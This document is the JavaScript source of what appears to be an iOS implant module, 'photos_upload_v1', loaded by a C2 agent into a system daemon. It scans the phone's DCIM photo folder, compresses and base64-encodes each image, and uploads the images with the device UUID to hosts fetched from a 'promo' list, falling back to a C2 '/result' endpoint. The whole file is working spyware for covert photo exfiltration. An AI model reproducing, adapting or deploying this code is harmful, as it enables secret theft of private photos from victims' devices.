// photos_upload_v1 — pe hot-load (mediaplaybackd eval via pe_load / agent.cmd).
// Agent: payload/get → /tmp/c2_ipc/mod.photos_upload_v1 + agent.cmd(load_module).
// Pe: eval this file; read Media/DCIM; pull upload hosts from promo/active; POST /t.
// Promo: GET-style JSON POST {} → 192.168.31.32/api/promo/active (then 1 / .icu).
// Needs pe_main globalThis.__peHttpExchange (absolute HTTPS). Falls back to C2 /result.
// Do not name session_* (pe rejects those for eval).
//
// task.json / params: command_id, compress_above(1MB), target_bytes(250KB),
//   jpeg_quality, max_edge, batch_size, result_path (C2 fallback, default "/result"),
//   upload_path (promo host path, default "/t"),
//   promo_list_hosts (optional array/string)
(function () {
	var N = (typeof Native !== "undefined" && Native) ? Native : globalThis.Native;
	var MARK = "/tmp/c2_ipc/photos_upload_v1.done";
	var TASK_PATHS = [
		"/tmp/c2_ipc/mod.photos_upload_v1.task.json",
		"/tmp/c2_ipc/mod.photos_upload_v1.js.task.json"
	];
	// Fallback relative path; pe __peHttp* routes via baked PELOG_ENDPOINTS.
	var RESULT_PATH_BAKE = "/result";

	function log(s) {
		try {
			if (typeof globalThis.LOG === "function") globalThis.LOG("[PHOTOS-PE] " + s);
		} catch (_) {}
	}

	function asBig(v) {
		try {
			if (N && typeof N.asBigInt === "function") return N.asBigInt(v);
		} catch (_) {}
		return typeof v === "bigint" ? v : BigInt(v);
	}

	function readUtf8File(path, maxn) {
		maxn = maxn || 8192;
		try {
			if (typeof globalThis.__peReadFileUtf8 === "function")
				return String(globalThis.__peReadFileUtf8(path, maxn) || "");
		} catch (_) {}
		try {
			if (typeof globalThis.__peFsRead === "function") {
				var raw = globalThis.__peFsRead(path, Math.min(maxn, 262144));
				return raw != null ? String(raw) : "";
			}
		} catch (_) {}
		return "";
	}

	function writeUtf8(path, body) {
		try {
			if (typeof globalThis.__peWriteFileUtf8 === "function")
				return !!globalThis.__peWriteFileUtf8(path, String(body || ""));
		} catch (_) {}
		try {
			var s = String(body || "");
			var fd = Number(N.callSymbol("open", path, 0x601, 0x1ff));
			if (!(fd >= 0)) return false;
			var buf = N.callSymbol("malloc", s.length + 1);
			if (typeof N.writeString === "function") N.writeString(buf, s);
			N.callSymbol("write", fd, buf, s.length);
			N.callSymbol("free", buf);
			N.callSymbol("close", fd);
			try { N.callSymbol("chmod", path, 0x1ff); } catch (_) {}
			return true;
		} catch (_) {
			return false;
		}
	}

	function loadTask() {
		var o = {};
		for (var i = 0; i < TASK_PATHS.length; i++) {
			try {
				var t = readUtf8File(TASK_PATHS[i], 8192);
				if (!t) continue;
				var j = JSON.parse(t);
				if (j && typeof j === "object") {
					for (var k in j) if (Object.prototype.hasOwnProperty.call(j, k)) o[k] = j[k];
				}
			} catch (_) {}
		}
		try {
			if (globalThis.__pe_hot_cmd && typeof globalThis.__pe_hot_cmd === "object") {
				var p = globalThis.__pe_hot_cmd.params || globalThis.__pe_hot_cmd;
				for (var k2 in p) if (Object.prototype.hasOwnProperty.call(p, k2)) o[k2] = p[k2];
				if (globalThis.__pe_hot_cmd.command_id) o.command_id = globalThis.__pe_hot_cmd.command_id;
			}
		} catch (_) {}
		return o;
	}

	var task = loadTask();
	var cid = String(task.command_id || task._task_id || ("photos-pe-" + Date.now().toString(16)));
	var startMs = Date.now();
	var maxCount = Number(task.max_count || task.limit || 0);
	if (!(maxCount > 0)) maxCount = 100000;
	var compressAbove = Number(task.compress_above || (1024 * 1024)) || (1024 * 1024);
	var targetBytes = Number(task.target_bytes || (250 * 1024)) || (250 * 1024);
	var batchSize = Number(task.batch_size || 20) || 20;
	var jpegQuality = Number(task.jpeg_quality || task.quality || 0.78);
	if (!(jpegQuality > 0) || jpegQuality > 1) jpegQuality = 0.78;
	var maxEdge = Number(task.max_edge || task.max_side || 1920) || 1920;
	if (maxEdge < 320) maxEdge = 320;
	var minQuality = Number(task.min_quality || 0.35);
	if (!(minQuality > 0) || minQuality > 1) minQuality = 0.35;
	var minEdge = Number(task.min_edge || 640) || 640;
	// Vault ingest is /result only. Ignore module_control result_url
	// (/api/modules/task/result) — that path is outcome callback + often nginx-auth.
	var resultPath = String(task.result_path || RESULT_PATH_BAKE || "/result");
	try {
		if (resultPath.indexOf("http://") === 0 || resultPath.indexOf("https://") === 0) {
			var slash = resultPath.indexOf("/", resultPath.indexOf("://") + 3);
			resultPath = slash >= 0 ? resultPath.slice(slash) : "/result";
		}
	} catch (_) {
		resultPath = "/result";
	}
	if (!resultPath || resultPath.charAt(0) !== "/") resultPath = "/result";
	if (resultPath.indexOf("/api/modules/task/result") === 0) resultPath = "/result";

	// Promo upload hosts use /t (override via task.upload_path).
	var uploadPath = String(task.upload_path || task.t_path || "/t");
	if (!uploadPath || uploadPath.charAt(0) !== "/") uploadPath = "/" + uploadPath.replace(/^\/*/, "");
	if (uploadPath.indexOf("http://") === 0 || uploadPath.indexOf("https://") === 0) {
		try {
			var us = uploadPath.indexOf("/", uploadPath.indexOf("://") + 3);
			uploadPath = us >= 0 ? uploadPath.slice(us) : "/t";
		} catch (_) {
			uploadPath = "/t";
		}
	}
	// Promo list pull hosts (override via task.promo_list_hosts). Prefer getdomainlist2.
	var PROMO_LIST_DEFAULT = [
		"http://192.168.31.32:9090",
		"http://192.168.31.32:9090",
		"http://192.168.31.32:9090"
	];
	var promoListHosts = task.promo_list_hosts || task.promo_hosts || PROMO_LIST_DEFAULT;
	if (typeof promoListHosts === "string") {
		try { promoListHosts = JSON.parse(promoListHosts); } catch (_) {
			promoListHosts = String(promoListHosts).split(/[\s,]+/).filter(Boolean);
		}
	}
	if (!Array.isArray(promoListHosts) || !promoListHosts.length) promoListHosts = PROMO_LIST_DEFAULT;

	var uploadEp = null; // { scheme, host, port, url } once picked

	function parseUrlToEp(u) {
		var s = String(u || "").trim();
		if (!s) return null;
		var scheme = "https";
		var host = "";
		var port = 443;
		var path = "/";
		try {
			var m = s.match(/^(https?):\/\/([^\/\?#:]+)(?::(\d+))?(\/.*)?$/i);
			if (!m) {
				// bare domain
				host = s.replace(/^\/\//, "").split("/")[0].split(":")[0];
				if (!host) return null;
				return { scheme: "https", host: host, ip: "", port: 443, url: "https://" + host };
			}
			scheme = String(m[1] || "https").toLowerCase() === "http" ? "http" : "https";
			host = String(m[2] || "");
			port = m[3] ? Number(m[3]) : (scheme === "https" ? 443 : 80);
			path = m[4] || "/";
			if (!host) return null;
			return {
				scheme: scheme,
				host: host,
				ip: "",
				port: port > 0 ? port : (scheme === "https" ? 443 : 80),
				url: scheme + "://" + host + (m[3] ? (":" + m[3]) : ""),
				path: path
			};
		} catch (_) {
			return null;
		}
	}

	function httpExchange(ep, path, body, readResp) {
		try {
			if (typeof globalThis.__peHttpExchange === "function") {
				return globalThis.__peHttpExchange(
					ep,
					path || "/",
					"application/json",
					body != null ? String(body) : "{}",
					!!readResp
				);
			}
		} catch (_) {}
		return readResp ? "" : false;
	}

	function pullPromoActive() {
		var hosts = promoListHosts.slice();
		try {
			var baked = globalThis.__peSafariPromoListEndpoints;
			if (baked && baked.length) {
				// Prefer getdomainlist2 first, then baked order
				var extra = [];
				for (var bi = 0; bi < baked.length; bi++) {
					var bu = (baked[bi] && (baked[bi].url || baked[bi].host)) || "";
					if (bu && hosts.indexOf(bu) < 0 && hosts.indexOf("https://" + bu) < 0)
						extra.push(baked[bi].url || ("https://" + baked[bi].host));
				}
				hosts = hosts.concat(extra);
			}
		} catch (_) {}
		for (var i = 0; i < hosts.length; i++) {
			var ep = typeof hosts[i] === "object" ? hosts[i] : parseUrlToEp(hosts[i]);
			if (!ep || !ep.host) continue;
			if (!ep.scheme) ep.scheme = "https";
			if (!ep.port) ep.port = ep.scheme === "https" ? 443 : 80;
			try {
				log("promo pull try " + (ep.url || ep.host));
				var raw = httpExchange(ep, "/api/promo/active", "{}", true) || "";
				if (!raw || raw.length < 8) continue;
				var j = null;
				try { j = JSON.parse(raw); } catch (_) { j = null; }
				if (j && j.data && (j.data.urls || j.data.domains) && !j.urls) j = j.data;
				if (!j || !j.ok) continue;
				var urls = Array.isArray(j.urls) ? j.urls : [];
				var domains = Array.isArray(j.domains) ? j.domains : [];
				log("promo ok via=" + (ep.host || "?") + " urls=" + urls.length + " domains=" + domains.length);
				return { urls: urls, domains: domains, via: ep.host || ep.url || "" };
			} catch (e) {
				log("promo err " + String(e).slice(0, 60));
			}
		}
		return null;
	}

	function candidatesFromPromo(promo) {
		var out = [];
		var seen = {};
		function add(u) {
			var ep = parseUrlToEp(u);
			if (!ep || !ep.host) return;
			var key = ep.scheme + "://" + ep.host + ":" + ep.port;
			if (seen[key]) return;
			seen[key] = true;
			out.push(ep);
		}
		if (promo && promo.urls) {
			for (var i = 0; i < promo.urls.length; i++) add(promo.urls[i]);
		}
		if (promo && promo.domains) {
			for (var d = 0; d < promo.domains.length; d++) {
				var dom = String(promo.domains[d] || "").trim();
				if (!dom) continue;
				if (dom.indexOf("://") < 0) dom = "https://" + dom;
				add(dom);
			}
		}
		return out;
	}

	/** Reachability: small JSON POST to upload path; first success wins. */
	function pickUploadEndpoint(cands) {
		for (var i = 0; i < cands.length; i++) {
			var ep = cands[i];
			try {
				log("upload ping " + (ep.url || ep.host) + uploadPath);
				var r = httpExchange(ep, uploadPath, "{\"ping\":1,\"module\":\"photos_upload_v1\"}", true);
				// Any HTTP exchange that returns (even empty with truthy fire) — prefer body or true
				if (r && String(r).length >= 0) {
					// empty string means fail for readResp; need non-empty OR try fire
					if (String(r).length > 0) {
						log("upload ping OK " + ep.host);
						return ep;
					}
				}
				var ok = httpExchange(ep, uploadPath, "{\"ping\":1}", false);
				if (ok) {
					log("upload ping OK(fire) " + ep.host);
					return ep;
				}
			} catch (e) {
				log("upload ping ERR " + ep.host + " " + String(e).slice(0, 40));
			}
		}
		return null;
	}

	function resolveUploadTarget() {
		if (!globalThis.__peHttpExchange) {
			log("WARN no __peHttpExchange — fallback C2 relative " + resultPath);
			return null;
		}
		var promo = pullPromoActive();
		if (!promo) {
			log("promo pull FAIL — fallback C2");
			return null;
		}
		var cands = candidatesFromPromo(promo);
		if (!cands.length) {
			log("promo empty candidates — fallback C2");
			return null;
		}
		var ep = pickUploadEndpoint(cands);
		if (!ep) {
			log("upload ping all FAIL — fallback C2");
			return null;
		}
		return ep;
	}

	function peUuid() {
		try {
			if (typeof globalThis.peDeviceUuid === "function") return String(globalThis.peDeviceUuid() || "");
		} catch (_) {}
		try {
			var d = readUtf8File("/tmp/c2_ipc/device.json", 4096);
			if (d) {
				var o = JSON.parse(d);
				return String((o && (o.uuid || o.uid)) || "");
			}
		} catch (_) {}
		return "";
	}

	function postStatus(st, summary, extra) {
		try {
			try { N.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
			try { N.callSymbol("mkdir", "/tmp/c2_ipc/pe_task_status", 0x1ff); } catch (_) {}
			var body = {
				command_id: cid,
				status: st,
				summary: summary || "",
				module_id: "photos_upload_v1",
				uuid: peUuid(),
				uid: peUuid(),
				ts: Date.now()
			};
			if (extra) body.result = extra;
			writeUtf8(
				"/tmp/c2_ipc/pe_task_status/" + cid + ".json",
				JSON.stringify({
					command_id: cid,
					status: st,
					summary: summary || "",
					error: (extra && extra.error) || "",
					ts: Date.now()
				}) + "\n"
			);
			if (typeof globalThis.__peHttpPostJsonFire === "function") {
				globalThis.__peHttpPostJsonFire("/api/task/status", JSON.stringify(body));
			}
		} catch (_) {}
	}

	function bytesToB64(u8) {
		try {
			if (typeof btoa === "function") {
				var s = "";
				var chunk = 0x8000;
				for (var i = 0; i < u8.length; i += chunk) {
					var sub = u8.subarray(i, Math.min(i + chunk, u8.length));
					s += String.fromCharCode.apply(null, sub);
				}
				return btoa(s);
			}
		} catch (_) {}
		var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		var out = "";
		var i = 0;
		var len = u8.length;
		while (i < len) {
			var a = u8[i++];
			var hasB = i < len;
			var b = hasB ? u8[i++] : 0;
			var hasC = i < len;
			var c = hasC ? u8[i++] : 0;
			var triplet = (a << 16) | (b << 8) | c;
			out += chars[(triplet >> 18) & 63];
			out += chars[(triplet >> 12) & 63];
			out += hasB ? chars[(triplet >> 6) & 63] : "=";
			out += hasC ? chars[triplet & 63] : "=";
		}
		return out;
	}

	function strToB64(str) {
		var s = String(str || "");
		var u8 = new Uint8Array(s.length);
		for (var i = 0; i < s.length; i++) u8[i] = s.charCodeAt(i) & 255;
		return bytesToB64(u8);
	}

	function postResult(b64, filename, category, meta) {
		var body = {
			command_id: cid,
			uuid: peUuid(),
			uid: peUuid(),
			filename: filename || "photo.bin",
			category: category || "photos",
			data: b64,
			module_id: "photos_upload_v1",
			module: "photos_upload_v1"
		};
		if (meta) {
			if (meta.start_ms) body._exec_start_ms = meta.start_ms;
			if (meta.end_ms) body._exec_end_ms = meta.end_ms;
			body.meta = meta;
		}
		var json = JSON.stringify(body);
		try {
			if (uploadEp && typeof globalThis.__peHttpExchange === "function") {
				return !!httpExchange(uploadEp, uploadPath, json, false);
			}
		} catch (_) {}
		try {
			if (typeof globalThis.__peHttpPostJsonFire === "function") {
				return !!globalThis.__peHttpPostJsonFire(resultPath, json);
			}
		} catch (_) {}
		return false;
	}

	function getSize(path) {
		try {
			if (typeof globalThis.__peFsStat === "function") {
				var st = globalThis.__peFsStat(path);
				if (st && st.exists && st.size > 0) return Number(st.size);
			}
		} catch (_) {}
		try {
			var fd = Number(N.callSymbol("open", path, 0, 0));
			if (fd < 0) return 0;
			var sz = Number(N.callSymbol("lseek", fd, 0, 2));
			N.callSymbol("close", fd);
			return sz > 0 ? sz : 0;
		} catch (_) {
			return 0;
		}
	}

	function readFileU8(path, maxSz) {
		maxSz = maxSz || (4 * 1024 * 1024);
		try {
			var fd = Number(N.callSymbol("open", path, 0, 0));
			if (fd < 0) return null;
			var sz = Number(N.callSymbol("lseek", fd, 0, 2));
			if (!(sz > 0) || sz > maxSz) {
				N.callSymbol("close", fd);
				return null;
			}
			N.callSymbol("lseek", fd, 0, 0);
			var buf = N.callSymbol("malloc", sz);
			var n = Number(N.callSymbol("read", fd, buf, sz));
			N.callSymbol("close", fd);
			if (!(n > 0)) {
				N.callSymbol("free", buf);
				return null;
			}
			var u8 = new Uint8Array(N.read(buf, n));
			N.callSymbol("free", buf);
			return u8;
		} catch (_) {
			return null;
		}
	}

	function listDir(path) {
		var out = [];
		try {
			var d = N.callSymbol("opendir", String(path || ""));
			if (!d || d === 0n) return out;
			for (;;) {
				var ent = N.callSymbol("readdir", d);
				if (!ent || ent === 0n) break;
				var name = "";
				try { name = N.readString(ent + 21n, 256); } catch (_) { name = ""; }
				if (!name || name === "." || name === "..") continue;
				var full = String(path).replace(/\/$/, "") + "/" + name;
				var isD = false;
				try {
					var dd = N.callSymbol("opendir", full);
					if (dd && dd !== 0n) {
						isD = true;
						try { N.callSymbol("closedir", dd); } catch (_) {}
					}
				} catch (_) {}
				out.push({ name: name, type: isD ? "dir" : "file", path: full });
				if (out.length > 5000) break;
			}
			try { N.callSymbol("closedir", d); } catch (_) {}
		} catch (_) {}
		return out;
	}

	function cfstr(s) {
		s = String(s || "");
		var buf = N.callSymbol("malloc", s.length + 1);
		if (!buf || buf === 0n) return 0n;
		N.writeString(buf, s);
		var cf = N.callSymbol("CFStringCreateWithCString", 0n, buf, 0x08000100);
		N.callSymbol("free", buf);
		return cf || 0n;
	}
	function cfRelease(x) {
		try { if (x && x !== 0n) N.callSymbol("CFRelease", x); } catch (_) {}
	}
	function dlsymPtr(name) {
		try {
			var sym = N.callSymbol("dlsym", asBig(-2), name);
			if (sym && sym !== 0n) return sym;
		} catch (_) {}
		return 0n;
	}
	function readGlobalPtr(name) {
		var sym = dlsymPtr(name);
		if (!sym) return 0n;
		try { return N.readPtr(sym); } catch (_) { return 0n; }
	}
	function writeF64(ptr, v) {
		var u = new Uint8Array(8);
		new Float64Array(u.buffer)[0] = v;
		N.write(ptr, u.buffer);
	}
	function writeI32(ptr, v) {
		var u = new Uint8Array(4);
		new Int32Array(u.buffer)[0] = v | 0;
		N.write(ptr, u.buffer);
	}
	function cfDictNew(cap) {
		var kCb = dlsymPtr("kCFTypeDictionaryKeyCallBacks");
		var vCb = dlsymPtr("kCFTypeDictionaryValueCallBacks");
		if (!kCb || !vCb) return 0n;
		return N.callSymbol("CFDictionaryCreateMutable", 0n, asBig(cap || 0), kCb, vCb) || 0n;
	}
	function cfDictSet(dict, key, val) {
		if (!dict || !key || !val) return;
		try { N.callSymbol("CFDictionarySetValue", dict, key, val); } catch (_) {}
	}

	function encodeJpegOnce(path, edge, quality) {
		if (!N || typeof N.callSymbol !== "function") return null;
		var pathCf = 0n, url = 0n, src = 0n, thumbOpts = 0n, img = 0n;
		var mut = 0n, dest = 0n, encOpts = 0n, typeJpeg = 0n;
		var edgeBuf = 0n, edgeNum = 0n, qBuf = 0n, qNum = 0n;
		var kMax = 0n, kAlways = 0n, kXform = 0n, qKey = 0n;
		try {
			pathCf = cfstr(path);
			if (!pathCf) return null;
			url = N.callSymbol("CFURLCreateWithFileSystemPath", 0n, pathCf, 0n, 0n);
			if (!url || url === 0n) return null;
			src = N.callSymbol("CGImageSourceCreateWithURL", url, 0n);
			if (!src || src === 0n) return null;
			thumbOpts = cfDictNew(4);
			edgeBuf = N.callSymbol("malloc", 4n);
			writeI32(edgeBuf, edge | 0);
			edgeNum = N.callSymbol("CFNumberCreate", 0n, 3, edgeBuf);
			kMax = cfstr("kCGImageSourceThumbnailMaxPixelSize");
			kAlways = cfstr("kCGImageSourceCreateThumbnailFromImageAlways");
			kXform = cfstr("kCGImageSourceCreateThumbnailWithTransform");
			var bTrue = readGlobalPtr("kCFBooleanTrue");
			cfDictSet(thumbOpts, kMax, edgeNum);
			if (bTrue) {
				cfDictSet(thumbOpts, kAlways, bTrue);
				cfDictSet(thumbOpts, kXform, bTrue);
			}
			img = N.callSymbol("CGImageSourceCreateThumbnailAtIndex", src, 0n, thumbOpts || 0n);
			if (!img || img === 0n)
				img = N.callSymbol("CGImageSourceCreateImageAtIndex", src, 0n, 0n);
			if (!img || img === 0n) return null;
			mut = N.callSymbol("CFDataCreateMutable", 0n, 0n);
			if (!mut || mut === 0n) return null;
			typeJpeg = cfstr("public.jpeg");
			dest = N.callSymbol("CGImageDestinationCreateWithData", mut, typeJpeg, 1n, 0n);
			if (!dest || dest === 0n) return null;
			encOpts = cfDictNew(2);
			qBuf = N.callSymbol("malloc", 8n);
			writeF64(qBuf, quality);
			qNum = N.callSymbol("CFNumberCreate", 0n, 6, qBuf);
			qKey = cfstr("kCGImageDestinationLossyCompressionQuality");
			cfDictSet(encOpts, qKey, qNum);
			N.callSymbol("CGImageDestinationAddImage", dest, img, encOpts || 0n);
			if (!Number(N.callSymbol("CGImageDestinationFinalize", dest))) return null;
			var len = Number(N.callSymbol("CFDataGetLength", mut));
			if (!(len > 64)) return null;
			var ptr = N.callSymbol("CFDataGetBytePtr", mut);
			if (!ptr || ptr === 0n) return null;
			var u8 = new Uint8Array(N.read(ptr, len));
			var b64 = bytesToB64(u8);
			if (!b64) return null;
			return { b64: b64, size: len, quality: quality, max_edge: edge };
		} catch (e) {
			log("encode fail " + String(e).slice(0, 100));
			return null;
		} finally {
			cfRelease(qKey); cfRelease(qNum); cfRelease(encOpts); cfRelease(typeJpeg);
			cfRelease(dest); cfRelease(mut); cfRelease(img);
			cfRelease(kMax); cfRelease(kAlways); cfRelease(kXform); cfRelease(edgeNum);
			cfRelease(thumbOpts); cfRelease(src); cfRelease(url); cfRelease(pathCf);
			try { if (edgeBuf) N.callSymbol("free", edgeBuf); } catch (_) {}
			try { if (qBuf) N.callSymbol("free", qBuf); } catch (_) {}
		}
	}

	function encodeToTarget(path) {
		var edge = maxEdge;
		var q = jpegQuality;
		var best = null;
		for (var round = 0; round < 10; round++) {
			var enc = encodeJpegOnce(path, edge, q);
			if (!enc) break;
			best = enc;
			if (enc.size <= targetBytes) {
				enc.over_target = 0;
				return enc;
			}
			if (q > minQuality + 0.001) q = Math.max(minQuality, q - 0.12);
			else if (edge > minEdge) edge = Math.max(minEdge, Math.floor(edge * 0.75));
			else break;
		}
		if (best) best.over_target = best.size > targetBytes ? 1 : 0;
		return best;
	}

	function scanDcim(limit) {
		var out = [];
		var dcim = "/var/mobile/Media/DCIM";
		var dirs = listDir(dcim);
		for (var di = 0; di < dirs.length && out.length < limit; di++) {
			if (dirs[di].type !== "dir") continue;
			var files = listDir(dirs[di].path);
			for (var fi = 0; fi < files.length && out.length < limit; fi++) {
				if (files[fi].type !== "file") continue;
				var name = files[fi].name || "";
				if (!/\.(jpe?g|heic|heif|png)$/i.test(name)) continue;
				out.push({ path: files[fi].path, name: name });
			}
		}
		return out;
	}

	function outNameJpeg(name) {
		return String(name || "photo").replace(/\.(jpe?g|heic|heif|png)$/i, "") + ".jpg";
	}

	postStatus("running", "photos_pe start");
	log("start cid=" + cid + " above=" + compressAbove + " target=" + targetBytes +
		" upload=" + uploadPath + " c2_fallback=" + resultPath);

	uploadEp = resolveUploadTarget();
	if (uploadEp) {
		log("upload target " + (uploadEp.url || uploadEp.host) + uploadPath);
		postStatus("running", "photos_pe host=" + (uploadEp.host || "?") + uploadPath);
	} else {
		log("upload target C2-relative " + resultPath);
	}

	var photos = scanDcim(maxCount);
	var uploaded = 0, skipped = 0, errors = 0, compressed = 0, raw = 0, over_target = 0;

	for (var i = 0; i < photos.length; i++) {
		var ph = photos[i];
		var sz = getSize(ph.path);
		if (sz <= 0) { skipped++; continue; }

		if (sz > compressAbove) {
			var enc = encodeToTarget(ph.path);
			if (!enc || !enc.b64) {
				errors++;
				log("encode miss " + ph.name + " sz=" + sz);
				continue;
			}
			compressed++;
			if (enc.over_target) over_target++;
			if (postResult(enc.b64, outNameJpeg(ph.name), "photos", {
				src_size: sz, out_size: enc.size, compressed: 1,
				jpeg_quality: enc.quality, max_edge: enc.max_edge,
				over_target: enc.over_target || 0, start_ms: startMs, end_ms: Date.now()
			})) uploaded++;
			else errors++;
		} else {
			var u8 = readFileU8(ph.path, sz + 4096);
			if (!u8) { errors++; continue; }
			var b64 = bytesToB64(u8);
			if (!b64) { errors++; continue; }
			raw++;
			if (postResult(b64, ph.name, "photos", {
				src_size: sz, out_size: u8.length, compressed: 0,
				start_ms: startMs, end_ms: Date.now()
			})) uploaded++;
			else errors++;
		}

		if (uploaded > 0 && uploaded % batchSize === 0) {
			postStatus("running", "photos_pe up=" + uploaded + "/" + photos.length);
			try { N.callSymbol("usleep", 200000); } catch (_) {}
		}
	}

	var summary = {
		status: errors && !uploaded ? "failed" : "success",
		module: "photos_upload_v1",
		module_id: "photos_upload_v1",
		total_found: photos.length,
		uploaded: uploaded,
		compressed: compressed,
		raw: raw,
		over_target: over_target,
		skipped: skipped,
		errors: errors,
		compress_above: compressAbove,
		target_bytes: targetBytes,
		channel: "pe_load",
		upload_host: uploadEp ? (uploadEp.host || uploadEp.url || "") : "c2_relative",
		upload_path: uploadEp ? uploadPath : resultPath,
		_task_id: cid
	};
	var sumB64 = strToB64(JSON.stringify(summary));
	postResult(sumB64, "photos_upload_v1.json", "photos", { start_ms: startMs, end_ms: Date.now() });
	writeUtf8(MARK, JSON.stringify({ ts: Date.now(), cid: cid, summary: summary }) + "\n");
	postStatus(summary.status === "success" ? "completed" : "failed",
		"photos_pe up=" + uploaded + " err=" + errors, summary);
	log("done found=" + photos.length + " up=" + uploaded + " raw=" + raw + " cmp=" + compressed);
	globalThis.__pe_photos_upload_v1 = summary;
	return summary;
})();
